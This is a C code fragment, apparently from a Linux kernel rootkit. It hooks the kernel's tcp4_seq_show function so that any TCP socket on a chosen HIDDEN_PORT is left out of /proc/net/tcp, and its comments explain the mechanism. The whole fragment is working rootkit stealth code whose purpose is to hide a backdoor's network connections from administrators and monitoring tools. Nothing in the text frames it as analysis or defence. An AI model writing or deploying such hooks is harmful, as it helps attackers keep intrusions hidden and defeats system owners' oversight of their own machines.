asmlinkage int (*org_tcp4_seq_show) (struct seq_file *seq, void *v);

// /proc/net/tcp show entry iterates over all tcp sockets and call tcp4_seq_show upon each one.
// sk points either to 'SEQ_START_TOKEN' or to a socket, the special value is used at the beginning of the
// iteration in order to print the title. 
static asmlinkage int hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;

    // sk->sk_num is the socket source port.
    if (sk != SEQ_START_TOKEN && sk->sk_num == HIDDEN_PORT)
        return 0;

    return org_tcp4_seq_show(seq, v);
}
